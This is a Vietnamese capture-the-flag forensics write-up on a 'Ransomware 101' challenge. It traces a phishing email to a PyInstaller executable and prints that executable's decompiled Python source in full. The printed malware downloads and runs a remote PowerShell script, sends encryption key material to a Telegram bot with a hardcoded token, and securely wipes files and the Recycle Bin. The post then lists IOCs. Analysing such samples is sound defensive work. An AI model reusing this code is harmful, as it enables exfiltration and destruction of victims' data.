---
title: (Vietnamese) Ransomware 101 Writeup (Author)
date: 2026-4-9 16:19:33
top_img: /img/ransom/ransom.png
cover: /img/ransom/ransom.png
categories:
  - Forensics
  - Writeup CTF
toc: true
---

# Ransomware 101
![image](https://hackmd.io/_uploads/Hk9y4Hr2be.png)

Một nữ nhiên viên văn phòng ở công ty V đã nhận được một bức thư. Sau khi mở bức thư đó cùng với một tệp đính kèm, máy của cô nhân viên này đã có một số hoạt động bất thường cùng với đó là một file tài liệu rất quan trọng của cô ấy đã biến mất. Là một nhân viên phòng SOC, hãy giúp cô ấy tìm ra nguyên nhân và khôi phục lại file quan trọng đó.
![image](https://hackmd.io/_uploads/H1gKmBH2bg.png)
[Link chall](https://ctf.viblo.asia/puzzles/ransomware-101-hcei6cqvdux)

## Step 1 
Mở file evidence bằng ftk imager 
![image](https://hackmd.io/_uploads/SywNNHBhZg.png)
Thấy 1 file extention .eml 
Google thì mình biết đây là dạng file lưu trữ email có thể mở bằng outlook hoặc Thunderbird 
![image](https://hackmd.io/_uploads/S1c_VSr3Zg.png)
Mở email thì có context sau 
![image](https://hackmd.io/_uploads/HyiJSrB2Wg.png)
Download file zip và mở bằng DIE
![image](https://hackmd.io/_uploads/H1jQrSH2-g.png)
Dùng pyinstxtractor extract ra xem source thử 

`python3 pyinstxtractor.py VCS\ antivirus.exe`

Nhờ ai recon suộc (mình code ngu + k biết đọc code) thì tìm được flow của app
![image](https://hackmd.io/_uploads/B1c0HSSnbe.png)
### Step 1.2
```python 
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'alo.py'
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import requests
import subprocess
import zipfile
current_dir = os.path.dirname(os.path.abspath(__file__))
ps_script_url = 'https://raw.githubusercontent.com/TMQrX/temp/master/Qwertyu.ps1'
ps_script_path = os.path.join(current_dir, 'ps.ps1')
sdelete_zip_url = 'https://download.sysinternals.com/files/SDelete.zip'
sdelete_zip_path = os.path.join(current_dir, 'SDelete.zip')
sdelete_exe_path = os.path.join(current_dir, 'sdelete.exe')
flag_file_path = 'C:\\flag.txt'
temp_encrypt_folder = os.path.join(os.getenv('TEMP'), 'encrypt')
def download_file(url, destination):
    response = requests.get(url)
    with open(destination, 'wb') as file:
        file.write(response.content)
def extract_sdelete(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)
def execute_powershell_script(script_path):
    process = subprocess.run(['powershell.exe', '-File', script_path], capture_output=True, text=True)
    output = process.stdout.splitlines()
    if len(output) >= 2:
        cee = output[0].strip()
        vee = output[1].strip()
        return (cee, vee)
    else:
        return (None, None)
def send_to_telegram(key, iv, token, chat_id):
    message = f'Key: {key}\nIV: {iv}'
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message, 'protect_content': True}
    response = requests.post(url, data=data)
def securely_delete_files(ps_script_path, flag_file_path):
    if os.path.exists(ps_script_path):
        subprocess.run([sdelete_exe_path, ps_script_path], check=True)
    if os.path.exists(flag_file_path):
        subprocess.run([sdelete_exe_path, flag_file_path], check=True)
def delete_encrypt_folder(folder_path):
    if os.path.exists(folder_path):
        for root, dirs, files in os.walk(folder_path, topdown=False):
            for file in files:
                file_path = os.path.join(root, file)
                move_to_recycle_bin(file_path)
            for dir in dirs:
                dir_path = os.path.join(root, dir)
                move_to_recycle_bin(dir_path)
        move_to_recycle_bin(folder_path)
def move_to_recycle_bin(item_path):
    ps_command = f'\n    $shell = New-Object -ComObject Shell.Application\n    $folder = $shell.Namespace(0xA)\n    $folder.MoveHere(\"{item_path}\")\n    '
    subprocess.run(['powershell.exe', '-Command', ps_command], check=True)
def empty_recycle_bin():
    ps_command = '\n    $recycleBin = New-Object -ComObject Shell.Application\n    $binFolder = $recycleBin.Namespace(0xA)\n    $items = $binFolder.Items()\n    $items | ForEach-Object { Remove-Item $_.Path -Force -Recurse }\n    '
    subprocess.run(['powershell.exe', '-Command', ps_command], check=True)
def main():
    download_file(ps_script_url, ps_script_path)
    download_file(sdelete_zip_url, sdelete_zip_path)
    extract_sdelete(sdelete_zip_path, current_dir)
    cee, vee = execute_powershell_script(ps_script_path)
    if cee and vee:
            telegram_token = '7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0'
            chat_id = '1617506446'
            send_to_telegram(cee, vee, telegram_token, chat_id)
    securely_delete_files(ps_script_path, flag_file_path)
    delete_encrypt_folder(temp_encrypt_folder)
    empty_recycle_bin()
if __name__ == '__main__':
    main()
```
Flow :
* Tải Qwertyu.ps1 từ GitHub
* Tải SDelete
* Giải nén SDelete
* Chạy PowerShell script để lấy ra 2 giá trị
* Gửi 2 giá trị đó lên Telegram
* Xóa script PowerShell
* Xóa C:\flag.txt
* Xóa %TEMP%\encrypt
* Dọn sạch Recycle Bin

### IOC
https://raw.githubusercontent.com/TMQrX/temp/master/Qwertyu.ps1

https://download.sysinternals.com/files/SDelete.zip

https://api.telegram.org/bot<token>/sendMessage

![image](https://hackmd.io/_uploads/BkyhZLBhbl.png)
Đến đây mình check user bot nhưng bot đã die 
Nên đã hỏi author 
![image](https://hackmd.io/_uploads/HyO0W8r2Wx.png)
Chall close , ggwp